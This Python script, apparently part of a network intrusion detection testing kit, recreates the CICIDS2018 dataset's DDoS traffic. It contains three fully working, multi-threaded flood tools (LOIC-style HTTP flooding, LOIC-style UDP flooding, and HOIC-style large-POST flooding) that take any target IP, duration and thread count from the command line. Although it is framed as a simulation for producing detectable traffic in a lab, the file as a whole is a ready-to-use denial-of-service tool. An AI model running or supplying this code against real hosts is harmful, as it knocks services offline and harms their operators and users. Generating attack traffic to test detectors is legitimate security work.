#!/usr/bin/env python
"""
DDoS Simulation - LOIC/HOIC Style (CICIDS2018 methodology)
Simulates Low Orbit Ion Cannon (LOIC) and High Orbit Ion Cannon (HOIC).
Uses multi-threaded HTTP/UDP flooding from multiple simulated sources.

CICIDS2018 used LOIC-HTTP, LOIC-UDP, and HOIC from 10 attacker machines.
  - DDoS-LOIC-HTTP: Feb 20 (10:12-11:17)
  - DDoS-LOIC-UDP:  Feb 20 (13:13-13:32)
  - DDoS-HOIC:      Feb 21 (14:05-15:05)

Should be detected as 'DDoS' by your NIDS.
"""

import sys
import time
import socket
import random
import string
import threading
import struct

# ======================================================================
# LOIC-HTTP: Multi-threaded HTTP flood
# ======================================================================
def loic_http(target_ip, target_port=80, duration=120, threads=20):
    """
    LOIC-HTTP style DDoS attack.
    Multiple threads send rapid HTTP GET/POST requests simultaneously.
    Unlike single-source DoS, this uses many concurrent threads to
    simulate distributed attack traffic from multiple sources.
    """
    print(f"\n{'='*60}")
    print(f"DDoS Attack - LOIC-HTTP Style (Multi-Thread HTTP Flood)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"\n[!] Starting LOIC-HTTP DDoS... (Your NIDS should show 'DDoS')")
    print(f"{'='*60}\n")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
    ]

    counters = {"requests": 0, "responses": 0, "errors": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def http_worker(worker_id):
        """LOIC-style HTTP worker - blast requests as fast as possible"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))

                # LOIC sends rapid fire requests - mix of GET and POST
                for _ in range(random.randint(10, 50)):
                    if stop_event.is_set():
                        break

                    ua = random.choice(user_agents)
                    rand_path = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))

                    if random.random() < 0.7:
                        # HTTP GET
                        request = (
                            f"GET /{rand_path}?{''.join(random.choices(string.digits, k=12))} HTTP/1.1\r\n"
                            f"Host: {target_ip}\r\n"
                            f"User-Agent: {ua}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                        )
                    else:
                        # HTTP POST with random body
                        body = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 200)))
                        request = (
                            f"POST /{rand_path} HTTP/1.1\r\n"
                            f"Host: {target_ip}\r\n"
                            f"User-Agent: {ua}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                            f"{body}"
                        )

                    try:
                        s.sendall(request.encode())
                        with lock:
                            counters["requests"] += 1
                    except:
                        break

                    try:
                        resp = s.recv(4096)
                        if resp:
                            with lock:
                                counters["responses"] += 1
                    except:
                        pass

                s.close()
            except Exception:
                with lock:
                    counters["errors"] += 1
                time.sleep(0.05)

    start_time = time.time()

    thread_list = []
    for tid in range(threads):
        t = threading.Thread(target=http_worker, args=(tid,), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                req = counters["requests"]
                resp = counters["responses"]
            rate = req / elapsed if elapsed > 0 else 0
            print(f"[+] HTTP: {req} requests | {resp} responses | {rate:.0f} req/s | {elapsed:.0f}s / {duration}s")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] LOIC-HTTP DDoS complete!")
        print(f"    Total requests: {counters['requests']}")
        print(f"    Total responses: {counters['responses']}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"    Threads: {threads}")
        print(f"{'='*60}\n")


# ======================================================================
# LOIC-UDP: UDP flood with random payloads
# ======================================================================
def loic_udp(target_ip, target_port=80, duration=120, threads=10):
    """
    LOIC-UDP style DDoS attack.
    Sends rapid UDP packets with random payloads.
    UDP has no handshake so it's extremely fast.
    """
    print(f"\n{'='*60}")
    print(f"DDoS Attack - LOIC-UDP Style (UDP Flood)")
    print(f"{'='*60}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"\n[!] Starting LOIC-UDP DDoS... (Your NIDS should show 'DDoS')")
    print(f"{'='*60}\n")

    counters = {"packets": 0, "bytes": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def udp_worker(worker_id):
        """LOIC-style UDP flood worker"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Send bursts of UDP packets
                for _ in range(100):
                    if stop_event.is_set():
                        break
                    # Random payload size (like LOIC)
                    payload_size = random.randint(64, 1024)
                    payload = bytes(random.getrandbits(8) for _ in range(payload_size))
                    # Vary the target port (common LOIC behavior)
                    port = target_port if random.random() < 0.7 else random.randint(1, 65535)
                    s.sendto(payload, (target_ip, port))
                    with lock:
                        counters["packets"] += 1
                        counters["bytes"] += payload_size
                s.close()
            except Exception:
                pass
            time.sleep(0.01)

    start_time = time.time()

    thread_list = []
    for tid in range(threads):
        t = threading.Thread(target=udp_worker, args=(tid,), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                pkts = counters["packets"]
                bts = counters["bytes"]
            rate = pkts / elapsed if elapsed > 0 else 0
            print(f"[+] UDP: {pkts} packets | {bts/1024/1024:.1f} MB | {rate:.0f} pps | {elapsed:.0f}s / {duration}s")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] LOIC-UDP DDoS complete!")
        print(f"    UDP packets: {counters['packets']}")
        print(f"    Total data: {counters['bytes']/1024/1024:.2f} MB")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"{'='*60}\n")


# ======================================================================
# HOIC-style: High-volume HTTP POST with boosters
# ======================================================================
def hoic_attack(target_ip, target_port=80, duration=120, threads=20):
    """
    HOIC (High Orbit Ion Cannon) style DDoS attack.
    Uses 'booster scripts' - sends randomized HTTP POST requests with
    large payloads. Targets multiple URLs simultaneously.
    More aggressive than LOIC with bigger payloads.
    """
    print(f"\n{'='*60}")
    print(f"DDoS Attack - HOIC Style (HTTP POST Flood w/ Boosters)")
    print(f"{'='*60}")
    print(f"Target: http://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"\n[!] Starting HOIC DDoS... (Your NIDS should show 'DDoS')")
    print(f"{'='*60}\n")

    # HOIC uses 'booster' scripts with custom headers and large payloads
    referers = [
        f"http://{target_ip}/",
        "http://www.google.com/",
        "http://www.facebook.com/",
        "http://www.youtube.com/",
        "http://www.twitter.com/",
    ]

    counters = {"requests": 0, "responses": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def hoic_worker(worker_id):
        """HOIC worker - sends heavy POST requests"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target_ip, target_port))

                for _ in range(random.randint(5, 20)):
                    if stop_event.is_set():
                        break

                    # Large random payload (HOIC boosters create big payloads)
                    body_size = random.randint(512, 4096)
                    body = ''.join(random.choices(string.ascii_letters + string.digits + '&=', k=body_size))
                    ref = random.choice(referers)
                    path = random.choice(["/", "/login", "/search", "/api/data", "/submit", "/upload"])

                    request = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                        f"Referer: {ref}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Accept: text/html,*/*\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                        f"{body}"
                    )

                    try:
                        s.sendall(request.encode())
                        with lock:
                            counters["requests"] += 1
                    except:
                        break

                    try:
                        resp = s.recv(4096)
                        if resp:
                            with lock:
                                counters["responses"] += 1
                    except:
                        pass

                s.close()
            except Exception:
                pass
            time.sleep(0.02)

    start_time = time.time()

    thread_list = []
    for tid in range(threads):
        t = threading.Thread(target=hoic_worker, args=(tid,), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                req = counters["requests"]
                resp = counters["responses"]
            rate = req / elapsed if elapsed > 0 else 0
            print(f"[+] HOIC: {req} requests | {resp} responses | {rate:.0f} req/s | {elapsed:.0f}s / {duration}s")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] HOIC DDoS complete!")
        print(f"    Requests sent: {counters['requests']}")
        print(f"    Responses received: {counters['responses']}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"    Threads: {threads}")
        print(f"{'='*60}\n")


# ======================================================================
# Main
# ======================================================================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 2_ddos_simulation.py <TARGET_IP> [OPTIONS]")
        print()
        print("Modes (matching CICIDS2018 tools):")
        print("  --loic-http     LOIC HTTP flood (default)")
        print("  --loic-udp      LOIC UDP flood")
        print("  --hoic          HOIC HTTP POST flood with boosters")
        print("  --all-ddos      Run all 3 methods sequentially")
        print()
        print("Options:")
        print("  --port <PORT>       Target port (default: 80)")
        print("  --duration <SEC>    Duration in seconds (default: 120)")
        print("  --threads <N>       Worker threads (default: 20)")
        print()
        print("Examples:")
        print("  python 2_ddos_simulation.py 192.168.56.102")
        print("  python 2_ddos_simulation.py 192.168.56.102 --loic-udp --duration 60")
        print("  python 2_ddos_simulation.py 192.168.56.102 --all-ddos --duration 120")
        sys.exit(1)

    target_ip = sys.argv[1]
    port = 80
    duration = 120
    mode = "loic-http"
    threads = 20

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--loic-http":
            mode = "loic-http"
            i += 1
        elif sys.argv[i] == "--loic-udp":
            mode = "loic-udp"
            i += 1
        elif sys.argv[i] == "--hoic":
            mode = "hoic"
            i += 1
        elif sys.argv[i] == "--all-ddos":
            mode = "all"
            i += 1
        else:
            i += 1

    if mode == "all":
        per_attack = max(duration // 3, 20)
        print(f"\n[*] Running all 3 DDoS methods, {per_attack}s each ({duration}s total)\n")
        loic_http(target_ip, port, per_attack, threads)
        time.sleep(3)
        loic_udp(target_ip, port, per_attack, threads // 2)
        time.sleep(3)
        hoic_attack(target_ip, port, per_attack, threads)
    elif mode == "loic-udp":
        loic_udp(target_ip, port, duration, threads // 2)
    elif mode == "hoic":
        hoic_attack(target_ip, port, duration, threads)
    else:
        loic_http(target_ip, port, duration, threads)
